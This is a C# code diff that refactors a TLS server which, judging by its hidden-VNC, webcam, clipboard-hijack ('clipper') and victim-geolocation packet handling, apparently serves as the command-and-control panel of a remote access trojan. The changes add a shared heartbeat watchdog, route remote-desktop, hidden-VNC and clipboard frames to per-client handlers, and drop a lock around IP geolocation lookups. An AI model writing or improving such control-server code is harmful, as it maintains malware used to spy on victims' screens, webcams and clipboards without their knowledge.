@@ -20,7 +20,7 @@ public class TlsServer
     private readonly DataStore _store;
     private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(5) };
     private readonly ConcurrentDictionary<string, (string country, string code)> _countryCache = new();
-    private readonly SemaphoreSlim _geoLock = new(1, 1);
+    private System.Timers.Timer? _watchdogTimer;
     public int MaxConnectedClients { get; set; } = 100_000;
 
     public string AuthKey { get; set; } = string.Empty;
@@ -104,11 +104,30 @@ public class TlsServer
 
         Log($"TLS Server started on port {port}");
         _ = AcceptLoop(_cts.Token);
+
+        _watchdogTimer = new System.Timers.Timer(15_000) { AutoReset = true };
+        _watchdogTimer.Elapsed += WatchdogTick;
+        _watchdogTimer.Start();
+    }
+
+    private void WatchdogTick(object? sender, System.Timers.ElapsedEventArgs e)
+    {
+        foreach (var client in ConnectedClients.Values.ToList())
+        {
+            if (!client.IsAlive)
+            {
+                Log($"[WATCHDOG] {client.Id} heartbeat timeout — disconnecting zombie.");
+                DisconnectClient(client.Id);
+            }
+        }
     }
 
     public void Stop()
     {
         if (!IsRunning) return;
+        _watchdogTimer?.Stop();
+        _watchdogTimer?.Dispose();
+        _watchdogTimer = null;
         _cts?.Cancel();
         _listener?.Stop();
         IsRunning = false;
@@ -142,9 +161,8 @@ public class TlsServer
 
     public Task SendToAll(Packet packet)
     {
-        // Parallel sends — each client has its own WriteLock so there's no contention
-        var tasks = ConnectedClients.Keys.ToList()
-            .Select(id => SendToClient(id, packet));
+        // Enumerate Values directly — no ToList() snapshot allocation
+        var tasks = ConnectedClients.Values.Select(c => SendToClient(c.Id, packet));
         return Task.WhenAll(tasks);
     }
 
@@ -152,10 +170,12 @@ public class TlsServer
     {
         if (ConnectedClients.TryRemove(clientId, out var client))
         {
-            // Dispose (not just Close) to free the socket handle immediately
             try { client.Cts.Cancel(); client.Stream?.Dispose(); } catch { }
             _store.RecordDisconnection(client.Hwid);
             Log($"Client {client.Id} ({client.Username}@{client.IP}) disconnected.");
+            // Purge all feature-window handlers for this client so they don't leak
+            foreach (var key in _handlers.Keys.Where(k => k.Item1 == clientId).ToList())
+                _handlers.TryRemove(key, out _);
             ClientDisconnected?.Invoke(client);
         }
     }
@@ -313,22 +333,8 @@ public class TlsServer
             Log($"Client {client.Id} connected ({info.Username}@{ip}, {client.Country})");
             ClientConnected?.Invoke(client);
 
-            // Heartbeat watchdog — kicks zombie connections that stopped sending heartbeats
-            // (e.g. client hard-killed, network dead but socket not yet closed by OS)
+            // No per-client watchdog task — _watchdogTimer (15s) handles zombie detection for all clients
             using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(serverCt, client.Cts.Token);
-            _ = Task.Run(async () =>
-            {
-                while (!linkedCts.Token.IsCancellationRequested)
-                {
-                    await Task.Delay(15_000, linkedCts.Token).ConfigureAwait(false);
-                    if (!linkedCts.Token.IsCancellationRequested && !client.IsAlive)
-                    {
-                        Log($"[WATCHDOG] {client.Id} heartbeat timeout — disconnecting zombie.");
-                        DisconnectClient(client.Id);
-                        break;
-                    }
-                }
-            }, linkedCts.Token).ContinueWith(_ => { }); // swallow OperationCanceledException
             while (!linkedCts.Token.IsCancellationRequested)
             {
                 var packet = await Packet.ReadFromStreamAsync(sslStream, linkedCts.Token);
@@ -417,7 +423,11 @@ public class TlsServer
                         break;
 
                     case PacketType.RdpFrame:
-                        RdpFrameReceived?.Invoke(client.Id, packet.Data);
+                        // Try O(1) per-client handler first; fall back to broadcast event
+                        if (_handlers.TryGetValue((client.Id, PacketType.RdpFrame), out var rdpH))
+                            try { rdpH(packet); } catch { }
+                        else
+                            RdpFrameReceived?.Invoke(client.Id, packet.Data);
                         break;
 
                     case PacketType.WcamFrame:
@@ -426,13 +436,21 @@ public class TlsServer
                         break;
 
                     case PacketType.RdpClipboard:
-                        var clipMsg = JsonConvert.DeserializeObject<RdpClipboardData>(packet.Data);
-                        if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
-                            RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
+                        if (_handlers.TryGetValue((client.Id, PacketType.RdpClipboard), out var rdpClipH))
+                            try { rdpClipH(packet); } catch { }
+                        else
+                        {
+                            var clipMsg = JsonConvert.DeserializeObject<RdpClipboardData>(packet.Data);
+                            if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
+                                RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
+                        }
                         break;
 
                     case PacketType.HvncFrame:
-                        HvncFrameReceived?.Invoke(client.Id, packet.Data);
+                        if (_handlers.TryGetValue((client.Id, PacketType.HvncFrame), out var hvncH))
+                            try { hvncH(packet); } catch { }
+                        else
+                            HvncFrameReceived?.Invoke(client.Id, packet.Data);
                         break;
 
                     case PacketType.ClipperDetected:
@@ -461,7 +479,7 @@ public class TlsServer
         }
         finally
         {
-            try { sslStream?.Close(); } catch { }
+            try { sslStream?.Dispose(); } catch { }
             tcp.Close();
             if (client != null) DisconnectClient(client.Id);
         }
@@ -474,29 +492,24 @@ public class TlsServer
 
         var lookupKey = isLocal ? "_public_" : ip;
 
+        // Fast path — already cached (no lock needed, ConcurrentDictionary is safe)
         if (_countryCache.TryGetValue(lookupKey, out var cached))
             return cached;
 
         try
         {
-            await _geoLock.WaitAsync();
-            try
-            {
-                if (_countryCache.TryGetValue(lookupKey, out var cached2))
-                    return cached2;
-
-                var url = isLocal
-                    ? "http://ip-api.com/json/?fields=country,countryCode"
-                    : $"http://ip-api.com/json/{ip}?fields=country,countryCode";
-                var json = await _http.GetStringAsync(url);
-                var obj = JsonConvert.DeserializeObject<dynamic>(json);
-                var country = (string?)obj?.country ?? "Unknown";
-                var code = (string?)obj?.countryCode ?? "";
-                var result = (country, code);
-                _countryCache[lookupKey] = result;
-                return result;
-            }
-            finally { _geoLock.Release(); }
+            // No serializing lock — different IPs resolve concurrently; same IP may resolve twice
+            // but the cache write is idempotent (same result) and TryAdd ensures no overwrite.
+            var url = isLocal
+                ? "http://ip-api.com/json/?fields=country,countryCode"
+                : $"http://ip-api.com/json/{ip}?fields=country,countryCode";
+            var json = await _http.GetStringAsync(url);
+            var obj = JsonConvert.DeserializeObject<dynamic>(json);
+            var country = (string?)obj?.country ?? "Unknown";
+            var code = (string?)obj?.countryCode ?? "";
+            var result = (country, code);
+            _countryCache.TryAdd(lookupKey, result);
+            return result;
         }
         catch
         {
